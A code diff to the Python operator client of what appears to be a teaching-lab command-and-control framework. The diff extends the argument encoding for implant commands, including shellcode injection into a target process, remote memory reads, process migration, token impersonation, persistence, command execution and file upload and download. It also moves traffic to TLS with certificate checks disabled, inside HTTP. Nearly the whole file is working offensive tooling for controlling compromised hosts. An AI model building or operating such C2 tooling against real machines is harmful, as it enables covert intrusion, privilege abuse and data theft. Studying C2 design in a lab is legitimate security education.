@@ -1,4 +1,6 @@
+import os
 import socket
+import ssl
 import struct
 
 from commands import CMD_NAMES
@@ -16,78 +18,153 @@ from protocol import (
     TASK_STATE_COMPLETED_CODE,
     TASK_STATE_LEASED_CODE,
     TASK_STATE_QUEUED_CODE,
-    decode_tlv,
-    encode_tlv,
+    recv_http_response_tlv,
+    send_http_request,
 )
 
 C2_HOST = "127.0.0.1"
 C2_PORT = 9002
 
 TASK_STATE_NAMES = {
-    TASK_STATE_QUEUED_CODE: "queued",
-    TASK_STATE_LEASED_CODE: "leased",
+    TASK_STATE_QUEUED_CODE:    "queued",
+    TASK_STATE_LEASED_CODE:    "leased",
     TASK_STATE_COMPLETED_CODE: "completed",
 }
 
 PENDING_TASK_ENTRY_SIZE = 16
 TASK_HISTORY_ENTRY_SIZE = 20
-RESULT_HEADER_SIZE = 16
+RESULT_HEADER_SIZE      = 16
+
+# Maps task_id -> local save path for download results.
+_DOWNLOAD_PATHS: dict = {}
 
 
-def encode_arg_bytes(cmd_name, arg):
+def encode_arg_bytes(cmd_name: str, arg: str) -> bytes:
     """
     Convert operator input into the binary argument format expected by the
-    implant.
+    implant command handler.
 
-    Students generally should not need to modify this unless the lab changes
-    the request format.
+    Argument conventions (must match the C handler's parsing):
+      impersonate-token <pid>                → DWORD pid (LE)
+      enable-privilege / disable-privilege   → UTF-8 privilege name
+      ls / cat / mkdir / rm / download       → UTF-8 remote path
+      upload <remote_path> <local_path>      → DWORD path_len + path_utf8 + file_bytes
+      ps / getpid / env / kill / persist /
+        unpersist / inspect-token / hostname /
+        whoami                               → (empty)
+      exec <command>                         → UTF-8 command string
+      shellcodeexec <pid> <shellcode_file>   → DWORD pid + raw shellcode bytes
+      memread <pid> <addr_hex> <size>        → DWORD pid + UINT64 addr + DWORD size
+      modulelist / handlelist / migrate <pid>→ DWORD pid (LE)
+      getenv <name>                          → UTF-8 name
+      setenv <NAME=VALUE>                    → UTF-8 "NAME=VALUE"
+      sleep <ms>                             → DWORD milliseconds (LE)
     """
-    if cmd_name in {"process-token", "token-privileges", "impersonate-token"}:
+    # PID-only commands
+    if cmd_name in {"impersonate-token", "modulelist", "handlelist", "migrate"}:
         return struct.pack("<I", int(arg, 10))
-    if cmd_name == "enable-privilege":
+
+    # Privilege name
+    if cmd_name in {"enable-privilege", "disable-privilege"}:
         return arg.encode("utf-8")
+
+    # Simple path (UTF-8)
+    if cmd_name in {"ls", "cat", "mkdir", "rm", "download", "getenv"}:
+        return arg.encode("utf-8")
+
+    # Environment variable set: "NAME=VALUE"
+    if cmd_name == "setenv":
+        return arg.encode("utf-8")
+
+    # Sleep: milliseconds as DWORD
+    if cmd_name == "sleep":
+        return struct.pack("<I", int(arg, 10))
+
+    # Upload: "remote_path local_path"
+    if cmd_name == "upload":
+        parts = arg.split(None, 1)
+        if len(parts) != 2:
+            raise ValueError("upload requires: <remote_path> <local_path>")
+        remote_path, local_path = parts
+        path_bytes = remote_path.encode("utf-8")
+        with open(local_path, "rb") as fh:
+            file_data = fh.read()
+        return struct.pack("<I", len(path_bytes)) + path_bytes + file_data
+
+    # Exec: shell command string
+    if cmd_name == "exec":
+        return arg.encode("utf-8")
+
+    # Shellcodeexec: "pid shellcode_file"
+    if cmd_name == "shellcodeexec":
+        parts = arg.split(None, 1)
+        if len(parts) != 2:
+            raise ValueError("shellcodeexec requires: <pid> <shellcode_file>")
+        pid_val = int(parts[0], 10)
+        with open(parts[1], "rb") as fh:
+            shellcode = fh.read()
+        return struct.pack("<I", pid_val) + shellcode
+
+    # Memread: "pid address_hex size"
+    if cmd_name == "memread":
+        parts = arg.split()
+        if len(parts) != 3:
+            raise ValueError("memread requires: <pid> <address_hex> <size>")
+        pid_val  = int(parts[0], 10)
+        addr_val = int(parts[1], 16)
+        size_val = int(parts[2], 10)
+        return struct.pack("<I", pid_val) + struct.pack("<Q", addr_val) + struct.pack("<I", size_val)
+
+    # No-argument commands
+    if cmd_name in {"ps", "getpid", "env", "kill", "persist", "unpersist",
+                    "inspect-token", "hostname", "whoami"}:
+        return b""
+
     return b""
 
 
+def _build_tls_context():
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    ctx.check_hostname  = False
+    ctx.verify_mode     = ssl.CERT_NONE
+    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
+    return ctx
+
+
+_TLS_CTX = _build_tls_context()
+
+
 def send_message(message_type, payload):
-    """Open a short-lived connection to the task server and send one message."""
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        sock.connect((C2_HOST, C2_PORT))
-        sock.sendall(encode_tlv(message_type, payload))
-        return decode_tlv(sock)
+        raw.connect((C2_HOST, C2_PORT))
+        conn = _TLS_CTX.wrap_socket(raw, server_hostname=C2_HOST)
+        send_http_request(conn, C2_HOST, message_type, payload)
+        return recv_http_response_tlv(conn)
+    except OSError:
+        return None
     finally:
-        sock.close()
+        raw.close()
 
 
 def submit_task(command_id, arg_bytes):
-    """Queue a task for the default test agent."""
-    payload = struct.pack(
-        "<III",
-        DEFAULT_AGENT_ID,
-        command_id,
-        len(arg_bytes),
-    ) + arg_bytes
+    payload = struct.pack("<III", DEFAULT_AGENT_ID, command_id, len(arg_bytes)) + arg_bytes
     return send_message(MSG_OPERATOR_SUBMIT_TASK, payload)
 
 
 def fetch_result(task_id):
-    """Query the task server for the result of a previously queued task."""
     return send_message(MSG_OPERATOR_GET_RESULT, struct.pack("<I", task_id))
 
 
 def fetch_pending_tasks():
-    """Request a snapshot of all queued or leased tasks from the server."""
     return send_message(MSG_OPERATOR_LIST_PENDING, b"")
 
 
 def fetch_task_history():
-    """Request a snapshot of all known tasks from the server."""
     return send_message(MSG_OPERATOR_LIST_HISTORY, b"")
 
 
 def display_pending_tasks():
-    """Display all currently queued or leased tasks without creating a task."""
     response = fetch_pending_tasks()
     if response is None:
         print("[!] Failed to query pending tasks")
@@ -98,7 +175,7 @@ def display_pending_tasks():
         print("[!] Unexpected response while querying pending tasks")
         return
 
-    task_count = struct.unpack("<I", payload[:4])[0]
+    task_count      = struct.unpack("<I", payload[:4])[0]
     expected_length = 4 + (task_count * PENDING_TASK_ENTRY_SIZE)
     if len(payload) < expected_length:
         print("[!] Pending task list payload is truncated")
@@ -109,25 +186,20 @@ def display_pending_tasks():
         return
 
     print("\nPending tasks:")
-    print("  task_id  agent_id  command                state")
+    print("  task_id  agent_id  command                     state")
 
     offset = 4
     for _ in range(task_count):
         task_id, agent_id, command_id, state_code = struct.unpack(
-            "<IIII",
-            payload[offset:offset + PENDING_TASK_ENTRY_SIZE],
+            "<IIII", payload[offset:offset + PENDING_TASK_ENTRY_SIZE]
         )
-        offset += PENDING_TASK_ENTRY_SIZE
+        offset      += PENDING_TASK_ENTRY_SIZE
         command_name = CMD_NAMES.get(command_id, f"0x{command_id:08X}")
-        state_name = TASK_STATE_NAMES.get(state_code, f"unknown({state_code})")
-        print(
-            f"  {task_id:<7}  {agent_id:<8}  "
-            f"{command_name:<21} {state_name}"
-        )
+        state_name   = TASK_STATE_NAMES.get(state_code, f"unknown({state_code})")
+        print(f"  {task_id:<7}  {agent_id:<8}  {command_name:<26} {state_name}")
 
 
 def display_task_history():
-    """Display all known tasks, including completed ones."""
     response = fetch_task_history()
     if response is None:
         print("[!] Failed to query task history")
@@ -138,7 +210,7 @@ def display_task_history():
         print("[!] Unexpected response while querying task history")
         return
 
-    task_count = struct.unpack("<I", payload[:4])[0]
+    task_count      = struct.unpack("<I", payload[:4])[0]
     expected_length = 4 + (task_count * TASK_HISTORY_ENTRY_SIZE)
     if len(payload) < expected_length:
         print("[!] Task history payload is truncated")
@@ -149,25 +221,20 @@ def display_task_history():
         return
 
     print("\nTask history:")
-    print("  task_id  agent_id  command                state       status")
+    print("  task_id  agent_id  command                     state       status")
 
     offset = 4
     for _ in range(task_count):
         task_id, agent_id, command_id, state_code, status = struct.unpack(
-            "<IIIII",
-            payload[offset:offset + TASK_HISTORY_ENTRY_SIZE],
+            "<IIIII", payload[offset:offset + TASK_HISTORY_ENTRY_SIZE]
         )
-        offset += TASK_HISTORY_ENTRY_SIZE
+        offset      += TASK_HISTORY_ENTRY_SIZE
         command_name = CMD_NAMES.get(command_id, f"0x{command_id:08X}")
-        state_name = TASK_STATE_NAMES.get(state_code, f"unknown({state_code})")
-        print(
-            f"  {task_id:<7}  {agent_id:<8}  "
-            f"{command_name:<21} {state_name:<10} 0x{status:08X}"
-        )
+        state_name   = TASK_STATE_NAMES.get(state_code, f"unknown({state_code})")
+        print(f"  {task_id:<7}  {agent_id:<8}  {command_name:<26} {state_name:<10} 0x{status:08X}")
 
 
 def check_task_result(display_result, task_id):
-    """Fetch and display the current state of one previously queued task."""
     result = fetch_result(task_id)
     if result is None:
         print("[!] Failed to query task result")
@@ -183,18 +250,14 @@ def check_task_result(display_result, task_id):
         return
 
     result_task_id, result_command_id, status, result_length = struct.unpack(
-        "<IIII",
-        result_payload[:RESULT_HEADER_SIZE],
+        "<IIII", result_payload[:RESULT_HEADER_SIZE]
     )
-    result_bytes = result_payload[
-        RESULT_HEADER_SIZE:RESULT_HEADER_SIZE + result_length
-    ]
+    result_bytes = result_payload[RESULT_HEADER_SIZE:RESULT_HEADER_SIZE + result_length]
     print(f"[*] Task {result_task_id} completed")
     display_result(result_command_id, status, result_bytes)
 
 
 def print_queue_result(response):
-    """Display the server response after submitting a new task."""
     if response is None:
         print("[!] Failed to submit task")
         return
@@ -205,4 +268,16 @@ def print_queue_result(response):
         return
 
     task_id = struct.unpack("<I", payload[:4])[0]
-    print(f"[*] Queued task {task_id} for agent {DEFAULT_AGENT_ID}")
+    print(f"[*] Queued task {task_id} for agent {DEFAULT_AGENT_ID}  "
+          f"(use 'check {task_id}' to retrieve the result)")
+    return task_id
+
+
+def register_download_path(task_id: int, save_path: str) -> None:
+    """Remember where to save the result for a download task."""
+    _DOWNLOAD_PATHS[task_id] = save_path
+
+
+def pop_download_path(task_id: int):
+    """Return and remove the saved path for a download task."""
+    return _DOWNLOAD_PATHS.pop(task_id, None)
